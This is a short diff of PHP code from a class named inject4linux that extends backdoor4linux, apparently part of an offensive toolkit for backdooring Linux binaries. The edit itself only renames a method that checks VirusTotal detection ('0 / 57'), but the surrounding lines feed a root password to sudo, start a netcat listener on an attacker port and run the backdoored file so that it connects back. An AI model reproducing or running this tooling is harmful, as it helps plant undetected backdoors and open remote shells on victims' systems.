@@ -132,7 +132,7 @@ class inject4linux extends backdoor4linux{
 		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user_local:$this->user_local $this->file_path " );}
 		else $this->cmd($this->prof,$query);
 		$this->requette("du -b $this->source_bin $this->file_path");
-		$this->file_file2virus2vt(); // 0 / 57
+		$this->file2virus2vt(); // 0 / 57
 		return $this;
 	}
 
@@ -146,7 +146,7 @@ class inject4linux extends backdoor4linux{
 		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user_local:$this->user_local $this->file_path " );}
 		else $this->cmd($this->prof,$query);
 		$this->requette("du -b $this->source_bin $this->file_path");
-		$this->file_file2virus2vt(); // 0 / 57
+		$this->file2virus2vt(); // 0 / 57
 		$cmd1 = "nc -l $this->attacker_port -v";
 		$cmd2 = "$this->file_path";
 		$this->exec_parallel($cmd1, $cmd2, 2);
